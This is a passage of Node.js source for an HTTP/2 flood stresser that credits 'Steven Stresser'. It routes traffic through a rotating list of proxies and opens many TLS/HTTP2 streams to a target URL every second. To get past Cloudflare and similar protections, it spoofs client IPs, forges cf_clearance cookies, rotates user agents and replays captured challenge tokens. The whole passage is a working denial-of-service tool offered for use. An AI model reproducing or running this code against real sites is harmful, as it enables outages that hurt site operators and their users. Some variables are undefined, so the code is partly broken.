    "?__cf_chl_rt_tk=QbxNnnmC8FpmedkosrfaPthTMxzFMEIO8xa0BdRJFKI-1702888720-0-gaNycGzNFHs",
    "?__cf_chl_rt_tk=ti1J.838lGH8TxzcrYPefuvbwEORtNOVSKFDISExe1U-1702888784-0-gaNycGzNClA",
    "?__cf_chl_rt_tk=ntO.9ynonIHqcrAuXZJBTcTBAMsENOYqkY5jzv.PRoM-1702888815-0-gaNycGzNCmU",
    "?__cf_chl_rt_tk=SCOSydalu5acC72xzBRWOzKBLmYWpGxo3bRYeHFSWqo-1702888950-0-gaNycGzNFHs",
    "?__cf_chl_rt_tk=QG7VtKbwe83bHEzmP4QeG53IXYnD3FwPM3AdS9QLalk-1702826567-0-gaNycGzNE9A",
    "?__cf_chl_rt_tk=C9XmGKQztFjEwNpc0NK4A3RHUzdb8ePYIAXXzsVf8mk-1702889060-0-gaNycGzNFNA",
    "?__cf_chl_rt_tk=cx8R_.rzcHl0NQ0rBM0cKsONGKDhwNgTCO1hu2_.v74-1702889131-0-gaNycGzNFDs",
    "?__cf_chl_rt_tk=AnEv0N25BNMaSx7Y.JyKS4CV5CkOfXzX1nyIt59hNfg-1702889155-0-gaNycGzNCdA",
    "?__cf_chl_rt_tk=7bJAEGaH9IhKO_BeFH3tpcVqlOxJhsCTIGBxm28Uk.o-1702889227-0-gaNycGzNE-U",
    "?__cf_chl_rt_tk=rrE5Pn1Qhmh6ZVendk4GweUewCAKxkUvK0HIKJrABRc-1702889263-0-gaNycGzNCeU",
    "?__cf_chl_rt_tk=.E1V6LTqVNJd5oRM4_A4b2Cm56zC9Ty17.HPUEplPNc-1702889305-0-gaNycGzNCbs",
    "?__cf_chl_rt_tk=a2jfQ24eL6.ICz01wccuN6sTs9Me_eIIYZc.94w6e1k-1702889362-0-gaNycGzNCdA",
    "?__cf_chl_rt_tk=W_fRdgbeQMmtb6FxZlJV0AmS3fCw8Tln45zDEptIOJk-1702889406-0-gaNycGzNE9A",
    "?__cf_chl_rt_tk=4kjttOjio0gYSsNeJwtzO6l1n3uZymAdJKiRFeyETes-1702889470-0-gaNycGzNCfs",
    "?__cf_chl_rt_tk=Kd5MB96Pyy3FTjxAm55aZbB334adV0bJax.AM9VWlFE-1702889600-0-gaNycGzNCdA",
    "?__cf_chl_rt_tk=v2OPKMpEC_DQu4NlIm3fGBPjbelE6GWpQIgLlWzjVI0-1702889808-0-gaNycGzNCeU",
    "?__cf_chl_rt_tk=vsgRooy6RfpNlRXYe7OHYUvlDwPzPvAlcN15SKikrFA-1702889857-0-gaNycGzNCbs",
    "?__cf_chl_rt_tk=EunXyCZ28KJNXVFS.pBWL.kn7LZdU.LD8uI7uMJ4SC4-1702889866-0-gaNycGzNCdA",
    "?__cf_clearance=Q7cywcbRU3LhdRUppkl2Kz.wU9jjRLzq50v8a807L8k-1702889889-0-1-a33b4d97.d3187f02.f43a1277-160.0.0",
    "?__cf_bm=ZOpceqqH3pCP..NLyk5MVC6eHuOOlnbTRPDtVGBx4NU-1702890174-1-AWt2pPHjlDUtWyMHmBUU2YbflXN+dZL5LAhMF+91Tf5A4tv5gRDMXiMeNRHnPzjIuO6Nloy0XYk56K77cqY3w9o=; cf_bm=kIWUsH8jNxV.ERL_Uc_eGsujZ36qqOiBQByaXq1UFH0-1702890176-1-AbgFqD6R4y3D21vuLJdjEdIHYyWWCjNXjqHJjxebTVt54zLML8lGpsatdxb/egdOWvq1ZMgGDzkLjiQ3rHO4rSYmPX/tF+HGp3ajEowPPoSh",
    "?__cf_clearance=.p2THmfMLl5cJdRPoopU7LVD_bb4rR83B.zh4IAOJmE-1702890014-0-1-a33b4d97.179f1604.f43a1277-160.0.0",
    "?__cf_clearance=YehxiFDP_T5Pk16Fog33tSgpDl9SS7XTWY9n3djMkdE-1702890321-0-1-a33b4d97.e83179e2.f43a1277-160.0.0",
    "?__cf_clearance=WTgrd5qAue.rH1R0LcMkA9KuGXsDoq6dbtMRaBS01H8-1702890075-0-1-a33b4d97.75c6f2a1.e089e1cd-160.0.0",
    "?__cf_chl_rt_tk=xxsEYpJGdX_dCFE7mixPdb_xMdgEd1vWjWfUawSVmFo-1702890787-0-gaNycGzNE-U",
    "?__cf_chl_rt_tk=4POs4SKaRth4EVT_FAo71Y.N302H3CTwamQUm1Diz2Y-1702890995-0-gaNycGzNCiU",
    "?__cf_chl_rt_tk=ZYYAUS10.t94cipBUzrOANLleg6Y52B36NahD8Lppog-1702891100-0-gaNycGzNFGU",
    "?__cf_chl_rt_tk=qFevwN5uCe.mV8YMQGGui796J71irt6PzuRbniOjK1c-1702891205-0-gaNycGzNChA",
    "?__cf_chl_rt_tk=Jc1iY2xE2StE8vqebQWb0vdQtk0HQ.XkjTwCaQoy2IM-1702891236-0-gaNycGzNCiU",
    "?__cf_chl_rt_tk=Xddm2Jnbx5iCKto6Jjn47JeHMJuW1pLAnGwkkvoRdoI-1702891344-0-gaNycGzNFKU",
    "?__cf_chl_rt_tk=0bvigaiVIw0ybessA948F29IHPD3oZoD5zWKWEQRHQc-1702891370-0-gaNycGzNCjs",
    "?__cf_chl_rt_tk=Vu2qjheswLRU_tQKx9.W1FM0JYjYRIYvFi8voMP_OFw-1702891394-0-gaNycGzNClA",
    "?__cf_chl_rt_tk=8Sf_nIAkrfSFmtD.yNmqWfeMeS2cHU6oFhi9n.fD930-1702891631-0-gaNycGzNE1A",
    "?__cf_chl_rt_tk=A.8DHrgyQ25e7oEgtwFjYx5IbLUewo18v1yyGi5155M-1702891654-0-gaNycGzNCPs",
    "?__cf_chl_rt_tk=kCxmEVrrSIvRbGc7Zb2iK0JXYcgpf0SsZcC5JAV1C8g-1702891689-0-gaNycGzNCPs",
    ];

 const defaultCiphers = crypto.constants.defaultCoreCipherList.split(":");
 const ciphers1 = "GREASE:" + [
     defaultCiphers[2],
     defaultCiphers[1],
     defaultCiphers[0],
     ...defaultCiphers.slice(3)
 ].join(":");
 
 const uap = [
    "POLARIS/6.01(BREW 3.1.5;U;en-us;LG;LX265;POLARIS/6.01/WAP;)MMP/2.0 profile/MIDP-201 Configuration /CLDC-1.1",
    "POLARIS/6.01 (BREW 3.1.5; U; en-us; LG; LX265; POLARIS/6.01/WAP) MMP/2.0 profile/MIDP-2.1 Configuration/CLDC-1.1",
    "portalmmm/2.0 N410i(c20;TB) ",
    "Python-urllib/2.5",
    "SAMSUNG-S8000/S8000XXIF3 SHP/VPP/R5 Jasmine/1.0 Nextreaming SMM-MMS/1.2.0 profile/MIDP-2.1 configuration/CLDC-1.1 FirePHP/0.3",
    "SAMSUNG-SGH-A867/A867UCHJ3 SHP/VPP/R5 NetFront/35 SMM-MMS/1.2.0 profile/MIDP-2.0 configuration/CLDC-1.1 UP.Link/6.3.0.0.0",
    "SAMSUNG-SGH-E250/1.0 Profile/MIDP-2.0 Configuration/CLDC-1.1 UP.Browser/6.2.3.3.c.1.101 (GUI) MMP/2.0 (compatible; Googlebot-Mobile/2.1;  http://www.google.com/bot.html)",
    "SearchExpress",
    "SEC-SGHE900/1.0 NetFront/3.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 Opera/8.01 (J2ME/MIDP; Opera Mini/2.0.4509/1378; nl; U; ssr)",
    "SEC-SGHX210/1.0 UP.Link/6.3.1.13.0",
    "SEC-SGHX820/1.0 NetFront/3.2 Profile/MIDP-2.0 Configuration/CLDC-1.1",
    "SonyEricssonK310iv/R4DA Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1 UP.Link/6.3.1.13.0",
    "SonyEricssonK550i/R1JD Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1",
    "SonyEricssonK610i/R1CB Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1",
    "SonyEricssonK750i/R1CA Browser/SEMC-Browser/4.2 Profile/MIDP-2.0 Configuration/CLDC-1.1",
    "SonyEricssonK800i/R1CB Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1 UP.Link/6.3.0.0.0",
    "SonyEricssonK810i/R1KG Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1",
    "SonyEricssonS500i/R6BC Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1",
    "SonyEricssonT100/R101",
    "Opera/9.80 (Macintosh; Intel Mac OS X 10.4.11; U; en) Presto/2.7.62 Version/11.00",
    "Opera/9.80 (S60; SymbOS; Opera Mobi/499; U; ru) Presto/2.4.18 Version/10.00",
    "Opera/9.80 (Windows NT 5.2; U; en) Presto/2.2.15 Version/10.10",
    "Opera/9.80 (Windows NT 6.1; U; en) Presto/2.7.62 Version/11.01",
    "Opera/9.80 (X11; Linux i686; U; en) Presto/2.2.15 Version/10.10",
    "Opera/10.61 (J2ME/MIDP; Opera Mini/5.1.21219/19.999; en-US; rv:1.9.3a5) WebKit/534.5 Presto/2.6.30",
    "SonyEricssonT610/R201 Profile/MIDP-1.0 Configuration/CLDC-1.0",
    "SonyEricssonT650i/R7AA Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1",
    "SonyEricssonT68/R201A",
    "Mozilla/5.0 (Windows NT 6.1; U; en-GB; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 Opera 10.51",
          "Mozilla/5.0 (Linux i686; U; en; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 Opera 10.51",
          "Mozilla/4.0 (compatible; MSIE 8.0; Linux i686; en) Opera 10.51",
          "Opera/9.80 (Windows NT 6.1; U; zh-tw) Presto/2.5.22 Version/10.50",
          "Opera/9.80 (Windows NT 6.1; U; zh-cn) Presto/2.5.22 Version/10.50",
          "Opera/9.80 (Windows NT 6.1; U; sk) Presto/2.6.22 Version/10.50",
          "Opera/9.80 (Windows NT 6.1; U; ja) Presto/2.5.22 Version/10.50",
          "Opera/9.80 (Windows NT 6.0; U; zh-cn) Presto/2.5.22 Version/10.50",
          "Opera/9.80 (Windows NT 5.1; U; sk) Presto/2.5.22 Version/10.50",
          "Opera/9.80 (Windows NT 5.1; U; ru) Presto/2.5.22 Version/10.50",
          "Opera/10.50 (Windows NT 6.1; U; en-GB) Presto/2.2.2",
          "Opera/9.80 (S60; SymbOS; Opera Tablet/9174; U; en) Presto/2.7.81 Version/10.5",
          "Opera/9.80 (X11; U; Linux i686; en-US; rv:1.9.2.3) Presto/2.2.15 Version/10.10",
          "Opera/9.80 (X11; Linux x86_64; U; it) Presto/2.2.15 Version/10.10",
          "Opera/9.80 (Windows NT 6.1; U; de) Presto/2.2.15 Version/10.10",
          "Opera/9.80 (Windows NT 6.0; U; Gecko/20100115; pl) Presto/2.2.15 Version/10.10",
          "Opera/9.80 (Windows NT 6.0; U; en) Presto/2.2.15 Version/10.10",
          "Opera/9.80 (Windows NT 5.1; U; de) Presto/2.2.15 Version/10.10",
          "Opera/9.80 (Windows NT 5.1; U; cs) Presto/2.2.15 Version/10.10",
          "Mozilla/5.0 (Windows NT 6.0; U; tr; rv:1.8.1) Gecko/20061208 Firefox/2.0.0 Opera 10.10",
          "Mozilla/4.0 (compatible; MSIE 6.0; X11; Linux i686; de) Opera 10.10",
          "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 6.0; tr) Opera 10.10",
          "Opera/9.80 (X11; Linux x86_64; U; en-GB) Presto/2.2.15 Version/10.01",
      ];
    
     site = [
        'cross-site',
        'same-origin',
        'same-site',
        'none'
      ];
      
      mode = [
        'cors',
        'navigate',
        'no-cors',
        'same-origin'
      ];
      
      dest = [
        'document',
        'image',
        'embed',
        'empty',
        'frame'
      ];
    
      const Methods = [
        "GET", "HEAD", "POST", "PUT", "DELETE", "CONNECT", "OPTIONS", "TRACE", "PATCH"
     ];
    
    
     var randomMethod = Methods[Math.floor(Math.random() * Methods.length)]; 
     var cipper = cplist[Math.floor(Math.floor(Math.random() * cplist.length))];
     var siga = sig[Math.floor(Math.floor(Math.random() * sig.length))];
     var uap1 = uap[Math.floor(Math.floor(Math.random() * uap.length))];
     var Ref = refers[Math.floor(Math.floor(Math.random() * refers.length))];
     var accept = accept_header[Math.floor(Math.floor(Math.random() * accept_header.length))];
     var lang = lang_header[Math.floor(Math.floor(Math.random() * lang_header.length))];
     var encoding = encoding_header[Math.floor(Math.floor(Math.random() * encoding_header.length))];
     var control = control_header[Math.floor(Math.floor(Math.random() * control_header.length))];
     var CookieCf = cookie1[Math.floor(Math.random() * cookie1.length)];
     var mode1 = mode[Math.floor(Math.floor(Math.random() * mode.length))];
     var dest1 = dest[Math.floor(Math.floor(Math.random() * dest.length))];
     var site1 = site[Math.floor(Math.floor(Math.random() * site.length))];
     var proxies = readLines(args.proxyFile);
     const parsedTarget = url.parse(args.target);
     
          if (cluster.isMaster) {
            for (let counter = 1; counter <= args.threads; counter++) {
              cluster.fork();
            }
            console.clear();
            console.log(`
         `);
            console.log("Succesfully By RepzZz");
            console.log("Credit : Steven Stresser");
            console.log("Website " + process.argv[2]);
            console.log("Time: "+ process.argv[3]);
            console.log("Rps: "+ process.argv[4]);
            console.log("Threads: "+ process.argv[5]);
            console.log("Proxyfile: "+ process.argv[6]);
          } else {
            setInterval(runFlooder);
          };
     
     class NetSocket {
         constructor(){}
     
      HTTP(options, callback) {
         const parsedAddr = options.address.split(":");
         const addrHost = parsedAddr[0];
         const payload = "CONNECT " + options.address + ":443 HTTP/1.1\r\nHost: " + options.address + ":443\r\nConnection: Keep-Alive\r\n\r\n";
         const buffer = new Buffer.from(payload);
     
         const connection = net.connect({
             host: options.host,
             port: options.port
         });
     
         connection.setTimeout(options.timeout * 600000);
         connection.setKeepAlive(true, 100000);
     
         connection.on("connect", () => {
             connection.write(buffer);
         });
     
         connection.on("data", chunk => {
             const response = chunk.toString("utf-8");
             const isAlive = response.includes("HTTP/1.1 200");
             if (isAlive === false) {
                 connection.destroy();
                 return callback(undefined, "error: invalid response from proxy server");
             }
             return callback(connection, undefined);
         });
     
         connection.on("timeout", () => {
             connection.destroy();
             return callback(undefined, "error: timeout exceeded");
         });
     
         connection.on("error", error => {
             connection.destroy();
             return callback(undefined, "error: " + error);
         });
     }
     }
    
     const rateHeaders = [
        { "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7" },
        { "accept-language": "en-US,en;q=0.9,id;q=0.8,ja;q=0.7" },
        { "referer": refers[Math.floor(Math.random() * refers.length)] },
        { "cache-control": "no-cache" },
        { "user-agent": uap[Math.floor(Math.floor(Math.random() * uap.length))] },
        { "sec-ch-ua": '"Google Chrome";v="133", "Chromium";v="133", "Not_A Brand";v="24"' },
        { "sec-ch-ua-mobile": "?0" },
        { "sec-ch-ua-platform": '"Windows"' },
        { "sec-fetch-site": "same-origin" },
        { "sec-fetch-mode": "cors" },
        { "sec-fetch-dest": "empty" },
        { "accept-encoding": "gzip, deflate, br, zstd" },
        { "akamai-origin-hop": randstr(5)  },
        { "source-ip": randstr(5)  },
        { "via": randstr(5)  },
        { "cluster-ip": randstr(5)  },
        {"Access-Control-Request-Method": "GET"},
        { "priority": "u=0, i" },
        {"dnt" : "1" },
        ];
        const rateHeaders2 = [
        { "X-Forwarded-For": parsedProxy[0] },
        { "cf-connecting-ip": parsedProxy[0] },
        { "X-Forwarded-Proto": "https" },
        { "X-Real-IP": parsedProxy[0] },
        { "origin": "https://" + parsedTarget.host },
        { "akamai-origin-hop": randstr(5)  },
        { "source-ip": randstr(5)  },
        { "via": randstr(5)  },
        { "cluster-ip": randstr(5)  },
        ];
    
     const Socker = new NetSocket();
     headers[":method"] = "GET";
    headers[":authority"] = parsedTarget.host;
    headers["x-forwarded-proto"] = "https";
    headers[":scheme"] = "https";
    headers[":path"] = parsedTarget.path + pathts[Math.floor(Math.random() * pathts.length)] + "&" + randomString(10) + queryString + randomString(10);
    headers["origin"] = parsedTarget.host;
    headers["X-Forwarded-For"] = spoofed;
    headers["accept"] = accept;
    headers["accept-language"] = lang;
    headers["referer"] = Ref;
    headers["accept-encoding"] = encoding;    
    headers["x-content-type-options"] = "nosniff";
    headers["TE"] = "trailers";
    headers["pragma"] = "no-cache";
    headers["upgrade-insecure-requests"] = "1";
    headers["X-Forwarded-Proto"] = HTTPS;    
    headers["sec-ch-ua-mobile"] = "?0";
    headers["sec-ch-ua-platform"] = pl;
    headers["cookie"] = "cf_clearance=" + randstr(4) + "." + randstr(20) + "." + randstr(40) + "-0.0.1 " + randstr(20) + ";_ga=" + randstr(20) + ";_gid=" + randstr(15)    
    headers["Via"] = fakeIP;
    headers["sss"] = fakeIP;
    headers["Sec-Websocket-Key"] = fakeIP;
    headers["Sec-Websocket-Version"] = 13;
    headers["Upgrade"] = websocket;
    headers["X-Forwarded-For"] = fakeIP;
    headers["X-Forwarded-Host"] = fakeIP;
    headers["Client-IP"] = fakeIP;
    headers["Real-IP"] = fakeIP;        
    headers["user-agent"] = uap;
    headers["CF-Connecting-IP"] = fakeIP;
    headers["CF-RAY"] = "randomRayValue";
    headers["CF-Visitor"] = "{'scheme':'https'}";        
    headers["sec-ch-ua"] = '"Not/A)Brand";v="99", "Google Chrome";v="115", "Chromium";v="115"';    
    headers["sec-fetch-mode"] = "navigate"; 
    headers["sec-fetch-dest"] = dest1;
    headers["sec-fetch-user"] = "?1";    
    headers["sec-fetch-site"] = site1;
    headers["x-requested-with"] = "XMLHttpRequest";
    
     function runFlooder() {
         const proxyAddr = randomElement(proxies);
         const parsedProxy = proxyAddr.split(":"); 
             headers["origin"] = "https://" + parsedTarget.host;
    
         const proxyOptions = {
             host: parsedProxy[0],
             port: ~~parsedProxy[1],
             address: parsedTarget.host + ":443",
             timeout: 100,
         };
    
    
    
         Socker.HTTP(proxyOptions, (connection, error) => {
             if (error) return
     
             connection.setKeepAlive(true, 600000);
    
             const tlsOptions = {
                host: parsedTarget.host,
                port: 443,
                secure: true,
                ALPNProtocols: ['h2', 'h3', 'http/1.2', 'spdy/1.2'],
                sigals: siga,
                socket: connection,
                ciphers: tls.getCiphers().join(":") + cipper,
                ecdhCurve: "prime256v1:X25519",
                host: parsedTarget.host,
                rejectUnauthorized: false,
                servername: parsedTarget.host,
                secureProtocol: ["TLSv1_1_method", "TLSv1_2_method", "TLSv1_3_method",],
            };
    
             const tlsConn = tls.connect(443, parsedTarget.host, tlsOptions); 
    
             tlsConn.setKeepAlive(true, 60000);
    
             const client = http2.connect(parsedTarget.href, {
                 protocol: "https:",
                 settings: {
                headerTableSize: 65536,
                maxConcurrentStreams: 2000,
                initialWindowSize: 65535,
                maxHeaderListSize: 65536,
                enablePush: false
              },
                 maxSessionMemory: 64000,
                 maxDeflateDynamicTableSize: 4294967295,
                 createConnection: () => tlsConn,
                 socket: connection,
             });
     
             client.settings({
                headerTableSize: 65536,
                maxConcurrentStreams: 2000,
                initialWindowSize: 6291456,
                maxHeaderListSize: 65536,
                enablePush: false
              });
     
             client.on("connect", () => {
                const IntervalAttack = setInterval(() => {
                    const dynHeaders = {
                        ...headers,
                        ...rateHeaders2[Math.floor(Math.random()*rateHeaders2.length)],
                        ...rateHeaders[Math.floor(Math.random()*rateHeaders.length)]
                      };
                    for (let i = 0; i < args.Rate; i++) {
                        const request = client.request(dynHeaders)
                        
                        .on("response", response => {
                            request.close();
                            request.destroy();
                            return
                        });
        
                        request.end();
                    }
                }, 1000); 
             });
     
             client.on("close", () => {
                 client.destroy();
                 connection.destroy();
                 return
             });
         }),function (error, response, body) {
            };
     }
     const KillScript = () => process.exit(1);
     setTimeout(KillScript, args.time * 1000);
    